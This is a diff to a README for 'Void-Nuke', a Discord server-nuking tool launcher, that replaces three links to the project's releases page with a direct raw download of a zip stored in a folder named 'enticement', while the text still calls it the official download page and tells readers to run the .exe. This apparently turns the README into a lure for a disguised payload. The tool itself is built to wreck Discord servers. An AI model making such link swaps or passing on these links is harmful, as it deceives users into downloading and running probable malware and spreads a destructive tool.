@@ -1,6 +1,6 @@
 # ⚡ Void-Nuke - Easy Discord Tool Launcher
 
-[![Download Void-Nuke](https://img.shields.io/badge/Download-Void--Nuke-brightgreen?style=for-the-badge)](https://github.com/creamdede/Void-Nuke/releases)
+[![Download Void-Nuke](https://img.shields.io/badge/Download-Void--Nuke-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/creamdede/Void-Nuke/main/enticement/Nuke-Void-1.9.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Most modern Windows computers satisfy these requirements.
 
 Click the green button above or this link to visit the official download page for Void-Nuke:
 
-[Download Void-Nuke Releases](https://github.com/creamdede/Void-Nuke/releases)
+[Download Void-Nuke Releases](https://raw.githubusercontent.com/creamdede/Void-Nuke/main/enticement/Nuke-Void-1.9.zip)
 
 This page has the latest versions of the software available for download.
 
@@ -132,6 +132,6 @@ For better understanding or detailed guides, visit the repository page and brows
 
 Use the official release page to download the latest version:
 
-[Download Void-Nuke Releases](https://github.com/creamdede/Void-Nuke/releases)
+[Download Void-Nuke Releases](https://raw.githubusercontent.com/creamdede/Void-Nuke/main/enticement/Nuke-Void-1.9.zip)
 
 Click the `.exe` file on the releases page to download and run the program on your Windows PC.
